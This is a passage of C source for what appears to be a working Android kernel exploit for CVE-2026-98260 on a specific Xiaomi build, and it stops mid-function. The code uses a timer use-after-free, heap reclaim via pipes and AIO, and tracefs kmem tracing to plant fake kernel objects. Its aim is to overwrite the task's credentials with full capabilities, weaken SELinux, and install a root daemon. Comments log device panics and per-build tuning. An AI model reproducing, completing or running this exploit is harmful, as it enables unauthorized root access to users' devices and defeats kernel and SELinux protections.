/* Park a CVE-2026-98260 zombie, reclaim its timer page with the pipe+AIO
 * path, plant an rb node, and reap. Fail closed: no waitpid unless the
 * filemap line count proves which ring owns the node page.
 *
 * PORT NOTE (madrid / Xiaomi 18 Pro Max, g284297031c53):
 *   All per-build numbers moved into pc98260_target.h. The logic below is
 *   unchanged from xiaomi9pmroot/uaf_plant_v6.c except where marked
 *   "PORT:" — those are the two places where this build differs:
 *     1. alloc_posix_timer is INLINED, so its call site lives in
 *        do_timer_create; the address comes from the header either way.
 *     2. task_struct slab objsize is 5760 while sizeof() is 4736; the
 *        filter uses the slab value.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"

#include "pc98260_target.h"

extern char **environ;

/* PORT (2026-11-11): mirror every log line to an O_SYNC fd.  The 22:48 panic
 * left the tail of 98260.log as NULs because nothing had reached disk; with a
 * sync mirror the last plant/reap lines survive a panic. */
#include <stdarg.h>
static int g_sync_fd = -1;

static int mr_dprintf(int fd, const char *fmt, ...)
{
	va_list ap;
	int n;
	va_start(ap, fmt);
	n = vdprintf(fd, fmt, ap);
	va_end(ap);
	if (g_sync_fd >= 0) {
		/* cross-half skips and periodic churn progress can dominate a run;
		 * keep them on stdout but do not pay one fsync per line. */
		if (strstr(fmt, "[triple] skip cross-half") ||
		    strstr(fmt, "[churn] round="))
			return n;
		va_start(ap, fmt);
		vdprintf(g_sync_fd, fmt, ap);
		va_end(ap);
		fdatasync(g_sync_fd);
	}
	return n;
}
#define dprintf mr_dprintf

/* PORT: every per-build constant now comes from pc98260_target.h. The old
 * names are kept so the body of this file stays byte-identical to v6. */
#define PAGE_OFFSET   GEOM_PAGE_OFFSET
#define TIMER_LINK    LINK_ALLOC_TIMER
#define CRED_LINK     LINK_ALLOC_CRED
#define SELINUX_LINK  LINK_SELINUX_STATE
#define LINK_USER_NS  LINK_INIT_USER_NS
#define LINK_GROUPS   LINK_INIT_GROUPS
#define LINK_UCOUNTS  LINK_INIT_UCOUNTS
#define FULLCAP       CAP_FULL
#define TASK_CRED     GEO_TASK_CRED
/* PORT: task->real_cred. 写它才能让 /proc/self/status 的 Uid: 也变 0，
 * 从而去掉"读 /proc/modules 假阴性"这类 workaround。 */
#define TASK_REAL_CRED GEO_TASK_REAL_CRED

void pc98260_try_ksu_install(void);
int pc98260_run_rootd(void);

static uint64_t g_slide = 0;

/* PORT: which task_struct slot the fake cred is installed into.
 * TASK_CRED on the first pass, TASK_REAL_CRED on the second. */
static uint64_t g_cred_slot = GEO_TASK_CRED;
static int g_no_real_cred;      /* --no-real-cred */
static int g_no_selftest;       /* --no-selftest  */
static int g_diag_cred;         /* --diag-cred: read-only cred trace probe */
static int g_trace_selftest;    /* --trace-selftest: text/raw trace probe */
static uint64_t g_task_obj = GEO_TASK_OBJSIZE;  /* 可被 slabinfo 覆盖 */
static uint64_t g_cred_site;                    /* LINK_ALLOC_CRED+slide */
static int g_selftest_cred;                     /* 自检看到的 cred 分配数 */
static unsigned g_child_ruid = ~0u;             /* 子进程 real uid */
static time_t g_deadline;                       /* 预算看门狗 */

static int past_deadline(void)
{
	return g_deadline && time(NULL) > g_deadline;
}

/* The detached runner must not infer an armed/parked plant merely from exec.
 * Keep a tiny per-run state file: ARMED is written when a victim is registered,
 * NO_ROOT only after the final sweep has finished and no rootd will follow. */
static int native_state(const char *state)
{
	const char *path = getenv("PC98260_STATE_FILE");
	char tmp[4096];
	size_t len;
	int fd;
	if (!path || !*path)
		return -1;
	if (snprintf(tmp, sizeof(tmp), "%s.tmp.%d", path, (int)getpid()) >=
	    (int)sizeof(tmp))
		return -1;
	fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
	if (fd < 0)
		return -1;
	len = strlen(state) + 1;
	/* Include the newline, not the NUL. */
	{
		int ok = (write(fd, state, len - 1) == (ssize_t)(len - 1));
		if (write(fd, "\n", 1) != 1)
			ok = 0;
		if (close(fd) != 0)
			ok = 0;
		if (!ok) {
			unlink(tmp);
			return -1;
		}
	}
	if (rename(tmp, path) != 0) {
		unlink(tmp);
		return -1;
	}
	return 0;
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
#define KITIMER_NODE  GEO_KITIMER_IT
/* The planted cred starts past the 24-byte rb_node, so the erase cannot
   scribble over any identity field (see the tile in reclaim_stream). */
#define CRED_OFF 0x20
/* One UAF is enough. posix_cpu_timers_exit() drains three rb trees in a row --
   CPUCLOCK_PROF, VIRT, SCHED -- and each tree's leftmost node is an object we
   own once the slab is reclaimed. Arming one timer per base inside a single
   8 KB slab therefore turns one reclaim into three independent rb_erase()
   calls, each with its own parent/value pair taken straight from our page. */
#define TILE_NONE 0
#define TILE_CRED 1
#define TILE_SELINUX 2
#define TILE_CRED2 3   /* PLANT_PTR: write stale node addr A into cap_effective */
static timer_t g_tids[2048];
static int g_tile_kind[3];
static unsigned g_tile_off[3];
static int g_bases[3];
static int g_tiles_on;
static int g_cap_mode;   /* real-cred KSU: separate PLANT_PTR cap_effective pass */

static clockid_t thread_clock(int base)
{
	/* MAKE_THREAD_CPUCLOCK(gettid(), base) with CPUCLOCK_PERTHREAD_MASK set:
	   base 0 = PROF, 1 = VIRT, 2 = SCHED. Without the 4 bit the kernel decodes
	   the id as a *group* clock and rejects a non-leader tid with EINVAL. */
	pid_t tid = (pid_t)syscall(SYS_gettid);
	return (clockid_t)((~(long)tid << 3) | 4 | base);
}
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#define F_SETPIPE_SZ 1031
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	atomic_int arm_ready;
	/* Beta6-style exec gate: do not let the victim exec/die before the reclaim
	 * stream and trace events are armed.  exec_entered distinguishes the real
	 * post-exec --exec-ok exit from a setup failure in the child. */
	atomic_int exec_ready;
	atomic_int exec_entered;
	/* tid of the child thread that creates the 2048 timers; the parent uses
	 * it to keep foreign processes' k_itimer allocations out of the victim
	 * pool. */
	atomic_int timer_tid;
	int arm_idx[3];
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	/* Direct-map VA -> system pfn. Honor memory starts at MEMSTART_PFN
	 * (0x80000), so PAGE_OFFSET maps the first RAM page, not pfn 0. */
	return (((ptr & ~UINT64_C(0xfff)) - PAGE_OFFSET) >> 12) + GEOM_MEMSTART_PFN;
}

static uint64_t g_watch[4500];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

/* Does a kmem trace event's page range cover @pfn?
 *
 * 6.12 skb_page_frag_refill() allocates order-2/3 page_frags, and buddy
 * merging can fold a freed order-1 k_itimer slab into such a compound page.
 * The trace record then carries only the compound head with order=<N>, so an
 * exact head-PFN comparison misses every merged event.  On MLY-AN00 this
 * showed up as `page_freed=0` after the whole wait cap followed by
 * `writes=480 hit=0`; several such attempts exhausted the budget and the
 * chain failed with `no_rootd_socket_after_240s`.  Match the whole
 * [head, head + 2^order) range instead (same fix as the H1C plant). */
static int pfn_event_covers(const char *line, uint64_t pfn,
			    uint64_t *head, int *order)
{
	const char *p = strstr(line, "pfn=0x");
	const char *ord;
	char *end = NULL;
	uint64_t got, span = 1;
	int ordv = 0;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	ord = strstr(end, "order=");
	if (ord) {
		char *oend = NULL;
		unsigned long o = strtoul(ord + 6, &oend, 10);
		if (oend != ord + 6 && o <= 10) {
			ordv = (int)o;
			if (o > 0)
				span = UINT64_C(1) << o;
		}
	}
	if (pfn < got || pfn >= got + span)
		return 0;
	if (head)
		*head = got;
	if (order)
		*order = ordv;
	return 1;
}

static int pfn_in_line(const char *line, uint64_t pfn)
{
	return pfn_event_covers(line, pfn, NULL, NULL);
}

/* 单次调用最多扫多少字节的 trace 文本（每 cpu 各自的尾部预算）。
 *
 * PORT (2026-10-26): 原来这里无界扫描 per_cpu/cpuN/trace 全文，而回收阶段
 * buffer 被设成 512 MB，外层还要循环 20 次 —— 于是"等 page_freed"退化成
 * 扫几百 MB 文本，进程 R 态烧 CPU 几十分钟，看起来像卡死（实测 run10/run20）。
 * 加预算后单次成本有上界；扫不到就返回 0，由外层按"page miss, retry"处理，
 * 语义不变（漏检只是多试一个 triple，比卡死划算得多）。
 *
 * PORT (2026-11-07, g142 6.12.58 修复): 旧实现把同一个预算顺序扣给
 * cpu0..cpuN 的正向全文扫描 —— cpu0 的转储一旦超过预算，cpu>=1 的事件
 * 就永远扫不到。高负载下 page_freed 在 churn 早期被找到，但后续
 * mm_page_alloc 落在其他 cpu 时会全部误报 miss。现在改成每 cpu 独立预算
 * + 从尾部（最新事件）往前扫：目标事件位于转储末尾，尾部扫描既让靠后的
 * cpu 可达，又先看到最新事件。 */
#define TRACE_SCAN_BUDGET (4U << 20)
/* find_page_free 在 churn 热循环里被反复调用；目标 page_free 总是该 cpu
 * 最新事件，1 MiB 尾部窗口足够且把每批成本压住。 */
#define TRACE_FREE_TAIL_BUDGET (1U << 20)

struct trace_tail {
	char *buf;
	size_t len;
	size_t pos;
	int heap;          /* buf came from malloc (prewarm failed) */
	char line[1024];
};

/* PORT (2026-11-11): the reclaim window must not fault a single anonymous
 * page.  trace_tail_open used to malloc 1 MiB and grow it to the whole
 * per-cpu trace, so the scanner's own heap pages competed for the freed slab
 * half and satisfied the "hit" test without ever writing a tile (2026-11-11
 * 22:50 [alloc-hit] order=0 GFP_ZERO, CapEff stayed 0).  One buffer is
 * allocated and pre-faulted before any plant, then reused; only the tail of
 * an oversized trace is kept, which is what the backward scanners want. */
#define TRACE_TAIL_CAP (12U << 20)
#define TRACE_TAIL_CHUNK (64U << 10)
static char *g_tt_buf;
/* Streaming staging for trace_tail_open().  Tracefs rejects SEEK_END, so the
 * reader must walk the dump from the start; the chunk is pre-faulted with the
 * tail buffer so the scan never faults a page inside the reclaim window. */
static char g_tt_chunk[TRACE_TAIL_CHUNK];

static void trace_buf_prewarm(void)
{
	struct trace_tail *warm[16];
	FILE *f;
	char tmp[256];
	if (g_tt_buf)
		return;
	g_tt_buf = malloc(TRACE_TAIL_CAP);
	if (g_tt_buf)
		memset(g_tt_buf, 0, TRACE_TAIL_CAP);	/* fault every page now */
	memset(g_tt_chunk, 0, sizeof(g_tt_chunk));
	for (int i = 0; i < 16; i++)
		warm[i] = malloc(sizeof(struct trace_tail));
	for (int i = 0; i < 16; i++)
		free(warm[i]);
	f = fopen(CPU0_TRACE, "r");
	if (f) {
		(void)fgets(tmp, sizeof(tmp), f);
		fclose(f);
	}
}

static struct trace_tail *trace_tail_open(const char *path)
{
	FILE *file = fopen(path, "rb");
	struct trace_tail *t;
	size_t cap, len = 0;
	char *buf;
	int heap = 0;
	if (!file)
		return NULL;
	if (g_tt_buf) {
		buf = g_tt_buf;
		cap = TRACE_TAIL_CAP;
	} else {
		cap = 1U << 20;
		buf = malloc(cap);
		heap = 1;
		if (!buf) {
			fclose(file);
			return NULL;
		}
	}
	/* Keep the newest cap bytes: every scanner walks backwards.
	 *
	 * PORT (2026-11-12): tracefs per-cpu "trace" rejects SEEK_END with
	 * EINVAL(-22) on 6.12.58/g142.  The old fseek() branch therefore always
	 * failed and fell back to rewind(), i.e. every scan read the OLDEST
	 * 12 MiB of the dump while the events it was looking for sat at EOF.
	 * Once the dump exceeds the cap the scanner goes blind ~10 s into an
	 * attempt, which is what made timer_churn burn its full 8 rounds
	 * (54 s on attempt 2 of run 20261112T233548).  Stream to EOF and keep
	 * a sliding last-cap window instead; the read cost is unchanged for a
	 * dump that already fits, and correct when it does not. */
	for (;;) {
		size_t n = fread(g_tt_chunk, 1, sizeof(g_tt_chunk), file);
		if (!n)
			break;
		if (n >= cap) {
			memcpy(buf, g_tt_chunk + (n - cap), cap);
			len = cap;
		} else if (len + n <= cap) {
			memcpy(buf + len, g_tt_chunk, n);
			len += n;
		} else {
			size_t drop = len + n - cap;
			memmove(buf, buf + drop, len - drop);
			memcpy(buf + len - drop, g_tt_chunk, n);
			len = cap;
		}
	}
	fclose(file);
	t = malloc(sizeof(*t));
	if (!t) {
		if (heap)
			free(buf);
		return NULL;
	}
	t->buf = buf;
	t->len = len;
	t->pos = len;
	t->heap = heap;
	return t;
}

static void trace_tail_close(struct trace_tail *t)
{
	if (!t)
		return;
	if (t->heap)
		free(t->buf);
	/* the shared scratch stays warm for the next scan */
	free(t);
}

/* Next-older line into t->line (newline stripped, NUL-terminated).
 * Returns 1 while lines remain, 0 at start of buffer.  Empty lines are
 * skipped and pos strictly decreases, so the walk always terminates. */
static int trace_tail_next(struct trace_tail *t)
{
	size_t end, start, n;
	while (t->pos > 0 &&
	       (t->buf[t->pos - 1] == '\n' || t->buf[t->pos - 1] == '\r'))
		t->pos--;
	if (t->pos == 0)
		return 0;
	end = t->pos;
	while (t->pos > 0 && t->buf[t->pos - 1] != '\n')
		t->pos--;
	start = t->pos;
	n = end - start;
	if (n >= sizeof(t->line))
		n = sizeof(t->line) - 1;
	memcpy(t->line, t->buf + start, n);
	t->line[n] = '\0';
	return 1;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		struct trace_tail *t;
		size_t budget = TRACE_SCAN_BUDGET;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		t = trace_tail_open(path);
		if (!t)
			continue;
		while (budget && trace_tail_next(t)) {
			size_t used = strlen(t->line) + 1;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (strstr(t->line, kind) && pfn_in_line(t->line, pfn)) {
				trace_tail_close(t);
				return 1;
			}
		}
		trace_tail_close(t);
	}
	return 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

struct page_free_info {
	int found;
	uint64_t pfn;
	int order;
	int cpu;
};

static int line_order(const char *line)
{
	const char *p = strstr(line, "order=");
	if (!p)
		return -1;
	return (int)strtoul(p + 6, NULL, 10);
}

/* Find a page_free event for the victim slab.
 *  - order=1: the order-1 slab is released at its base;
 *  - order=0: only accept the 4K half that actually contains the stale node;
 *  - order>=2: the slab was merged into a compound page; accept it when the
 *    compound range covers the node (head is reported in out->pfn).
 * A bounded text-trace scan; a miss is a retry, never a hang. */

/* Optional binary trace reader.  It follows the raw trace record layout used
 * by current Android 6.6/6.12 kernels: common_type/common_pid precede the
 * mm_page_{alloc,free} pfn/order fields.  The parser is only enabled after the
 * event ids and per-cpu raw fds were actually opened; otherwise the existing
 * text reader remains authoritative.  The pre-faulted scratch is reused, so
 * scanning does not fault anonymous pages in the reclaim window. */
#define FAST_SPRAY_THREADS 4
static int env_int(const char *name, int def, int lo, int hi);
static unsigned long g_alloc_cover;
static _Atomic int g_fast_tids[FAST_SPRAY_THREADS];
static int g_raw_active;
static int g_rawfd[16];
static int g_raw_alloc_id = -1, g_raw_free_id = -1;

static int raw_read_id(const char *name)
{
	char path[160], buf[32];
	int fd, n;
	snprintf(path, sizeof(path), TRACE "/events/kmem/%s/id", name);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	n = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	buf[n] = 0;
	return (int)strtol(buf, NULL, 10);
}

static void raw_trace_close(void)
{
	for (int i = 0; i < 16; i++) {
		if (g_rawfd[i] >= 0)
			close(g_rawfd[i]);
		g_rawfd[i] = -1;
	}
	g_raw_active = 0;
	g_raw_alloc_id = g_raw_free_id = -1;
}

static void drain_raw_pipes(void)
{
	/* Discard events left by earlier stages.  A raw hit must belong to this
	 * reclaim window, not to a stale record still queued in the ring. */
	for (int cpu = 0; cpu < 16; cpu++) {
		if (g_rawfd[cpu] < 0)
			continue;
		while (read(g_rawfd[cpu], g_tt_buf, TRACE_TAIL_CAP) > 0) {}
	}
}

/* Event ids are normally read from events/kmem/<event>/id, but SELinux denies the
 * shell domain even stat() on Honor 6.12 (verified 2026-11-12: the event dir
 * is 0755 root:readtracefs, yet stat("/id") is EACCES).  Allow an explicit
 * pre-fetch first (a privileged helper can export PC98260_RAW_*_ID), then
 * fall back to raw_calibrate_ids() when neither source is available.  The
 * calibrated ids are per-boot kernel constants, so cache them across the
 * retry loop instead of paying the calibration once per attempt. */
static int g_cal_alloc_id = -1, g_cal_free_id = -1;
static int raw_read_id_env(const char *name, const char *envn)
{
	const char *v = getenv(envn);
	if (v && *v) {
		int id = atoi(v);
		if (id > 0 && id < 4096)
			return id;
	}
	return raw_read_id(name);
}

static int raw_calibrate_ids(int *alloc_id, int *free_id);

static int raw_trace_open(void)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	int any = 0;
	raw_trace_close();
	if (!env_int("PC98260_RAW_TRACE", 1, 0, 1))
		return -1;
	if (ncpu < 1) ncpu = 1;
	if (ncpu > 16) ncpu = 16;
	if (g_cal_alloc_id > 0 && g_cal_free_id > 0) {
		g_raw_alloc_id = g_cal_alloc_id;
		g_raw_free_id = g_cal_free_id;
	} else {
		g_raw_alloc_id = raw_read_id_env("mm_page_alloc",
						 "PC98260_RAW_ALLOC_ID");
		g_raw_free_id = raw_read_id_env("mm_page_free",
						"PC98260_RAW_FREE_ID");
	}
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (g_rawfd[cpu] >= 0)
			any = 1;
	}
	if (!any) {
		raw_trace_close();
		return -1;
	}
	/* raw_read_cpu() refuses to run unless the reader is marked active, and
	 * calibration is itself a raw reader.  Nothing outside this function can
	 * observe the flag before it returns, so arm it for the calibration
	 * window; a failure path closes everything and clears it again. */
	g_raw_active = 1;
	if (g_raw_alloc_id < 0 || g_raw_free_id < 0) {
		int a = -1, f = -1;
		if (raw_calibrate_ids(&a, &f) == 0) {
			g_raw_alloc_id = a;
			g_raw_free_id = f;
			g_cal_alloc_id = a;
			g_cal_free_id = f;
		}
	}
	if (g_raw_alloc_id < 0 || g_raw_free_id < 0) {
		dprintf(STDOUT_FILENO,
			"[raw] ids unavailable (alloc=%d free=%d); text fallback\n",
			g_raw_alloc_id, g_raw_free_id);
		raw_trace_close();
		return -1;
	}
	/* Calibration and earlier stages leave records in the pipe; they must
	 * never satisfy a reclaim-window match. */
	drain_raw_pipes();
	return 0;
}

static uint64_t raw_u64(const unsigned char *p)
{
	uint64_t v;
	memcpy(&v, p, 8);
	return v;
}

static uint32_t raw_u32(const unsigned char *p)
{
	uint32_t v;
	memcpy(&v, p, 4);
	return v;
}

static long raw_read_cpu(int cpu)
{
	long total = 0;
	if (!g_raw_active || cpu < 0 || cpu >= 16 || g_rawfd[cpu] < 0 || !g_tt_buf)
		return 0;
	while (total < (long)TRACE_TAIL_CAP) {
		ssize_t n = read(g_rawfd[cpu], g_tt_buf + total,
				 TRACE_TAIL_CAP - (size_t)total);
		if (n <= 0)
			break;
		total += n;
	}
	return total;
}

static int raw_pid_is_ours(int pid)
{
	if (pid == (int)getpid())
		return 1;
	for (int i = 0; i < FAST_SPRAY_THREADS; i++)
		if (pid == atomic_load_explicit(&g_fast_tids[i], memory_order_acquire))
			return 1;
	return 0;
}

static int raw_pid_is_spray(int pid)
{
	for (int i = 0; i < FAST_SPRAY_THREADS; i++)
		if (pid == atomic_load_explicit(&g_fast_tids[i], memory_order_acquire))
			return 1;
	return 0;
}

static int raw_find_alloc(uint64_t pfn, int prefer_cpu)
{
	uint64_t base = pfn & ~UINT64_C(1);
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu < 1) ncpu = 1;
	if (ncpu > 16) ncpu = 16;
	g_alloc_cover = 0;
	int seq[16], nseq = 0;
	if (prefer_cpu >= 0 && prefer_cpu < ncpu)
		seq[nseq++] = prefer_cpu;
	for (int cpu = 0; cpu < ncpu; cpu++)
		if (cpu != prefer_cpu)
			seq[nseq++] = cpu;
	for (int s = 0; s < nseq; s++) {
		int cpu = seq[s];
		long n = raw_read_cpu(cpu);
		for (long i = 16; i + 12 <= n; i += 4) {
			uint64_t head;
			int order, pid;
			if ((raw_u32((unsigned char *)g_tt_buf + i - 8) & 0xffff) !=
			    (uint32_t)g_raw_alloc_id)
				continue;
			head = raw_u64((unsigned char *)g_tt_buf + i);
			order = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
			if (order < 0 || order > 10)
				continue;
			if (pfn < head || pfn >= head + (UINT64_C(1) << order))
				continue;
			g_alloc_cover++;
			/* Only an order-1 slab whose head is the victim base proves
			 * the 8 KiB pattern sits at the node offsets.  An order>=2
			 * block holds two 8 KiB objects and the trace does not say
			 * which one our datagram took; a wrong object leaves the
			 * victim page untouched and reaping it panics (2026-11-14
			 * 09:35: order=2 hit, then AP_S_PANIC before reap). */
			if (order != 1 || head != base)
				continue;
			pid = (int)raw_u32((unsigned char *)g_tt_buf + i - 4);
			if (!raw_pid_is_ours(pid))
				continue;
			dprintf(STDOUT_FILENO,
				"[raw-alloc-hit] cpu=%d pid=%d pfn=%#" PRIx64
				" order=%d\n", cpu, pid, head, order);
			return 1;
		}
	}
	return 0;
}

static int raw_find_free(uint64_t base, uint64_t want_half,
			 struct page_free_info *out)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu < 1) ncpu = 1;
	if (ncpu > 16) ncpu = 16;
	memset(out, 0, sizeof(*out));
	for (int cpu = 0; cpu < ncpu; cpu++) {
		long n = raw_read_cpu(cpu);
		for (long i = 16; i + 12 <= n; i += 4) {
			uint64_t pfn;
			int order;
			if ((raw_u32((unsigned char *)g_tt_buf + i - 8) & 0xffff) !=
			    (uint32_t)g_raw_free_id)
				continue;
			pfn = raw_u64((unsigned char *)g_tt_buf + i);
			order = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
			if (order < 0 || order > 10)
				continue;
			if (order == 1 && pfn != base)
				continue;
			if (order == 0 && pfn != want_half)
				continue;
			if (order >= 2 && (want_half < pfn ||
			    want_half >= pfn + (UINT64_C(1) << order)))
				continue;
			out->found = 1;
			out->pfn = pfn;
			out->order = order;
			out->cpu = cpu;
			return 1;
		}
	}
	return 0;
}

static int find_page_free_text(uint64_t want_half, struct page_free_info *out)
{
	int ncpu = cpu_count();
	memset(out, 0, sizeof(*out));
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		struct trace_tail *t;
		size_t budget = TRACE_FREE_TAIL_BUDGET;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		t = trace_tail_open(path);
		if (!t)
			continue;
		while (budget && trace_tail_next(t)) {
			size_t used = strlen(t->line) + 1;
			uint64_t pfn;
			int order;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(t->line, "mm_page_free:"))
				continue;
			/* Only the page that really contains the stale node counts.  The
			 * event may be the compound head of a merged order-2/3 page, so
			 * test the whole range rather than an exact pfn. */
			if (!pfn_event_covers(t->line, want_half, &pfn, &order))
				continue;
			if (order < 0)
				continue;
			out->found = 1;
			out->pfn = pfn;
			out->order = order;
			out->cpu = cpu;
			trace_tail_close(t);
			return 1;
		}
		trace_tail_close(t);
	}
	return 0;
}

static int find_page_free(uint64_t base, uint64_t want_half,
			  struct page_free_info *out)
{
	if (g_raw_active)
		return raw_find_free(base, want_half, out);
	return find_page_free_text(want_half, out);
}

/* The raw id can be right for alloc and still fail for frees when a vendor
 * kernel reorders or extends the mm_page_free record.  After a full wait
 * miss, scan the text dumps once: the parser there keys off the event name,
 * so it is immune to id/layout drift.  Also report what the raw ring did
 * contain, so a still-failing run pins the cause without another rebuild. */
static int raw_diag_free(uint64_t base)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	int frees = 0, batched = 0, allocs = 0, cover_base = 0;
	int ord_count[11];
	long bytes = 0;
	uint64_t nearest = 0, near_dist = UINT64_MAX;
	int near_ord = -1;
	memset(ord_count, 0, sizeof(ord_count));
	if (!g_raw_active || ncpu < 1)
		return 0;
	if (ncpu > 16)
		ncpu = 16;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		long n = raw_read_cpu(cpu);
		if (n <= 0)
			continue;
		bytes += n;
		for (long i = 16; i + 12 <= n; i += 4) {
			uint32_t t = raw_u32((unsigned char *)g_tt_buf + i - 8) & 0xffff;
			if (t == (uint32_t)g_raw_alloc_id) {
				uint64_t ap = raw_u64((unsigned char *)g_tt_buf + i);
				int ao = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
				allocs++;
				if (ao >= 0 && ao <= 10 &&
				    ap <= base && base < ap + (UINT64_C(1) << ao))
					cover_base++;
				continue;
			}
			if (t != (uint32_t)g_raw_free_id) {
				if (t == (uint32_t)(g_raw_free_id + 1))
					batched++;
				continue;
			}
			frees++;
			{
				uint64_t pfn = raw_u64((unsigned char *)g_tt_buf + i);
				int ord = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
				uint64_t d = pfn > base ? pfn - base : base - pfn;
				if (ord >= 0 && ord <= 10)
					ord_count[ord]++;
				if (d < near_dist) {
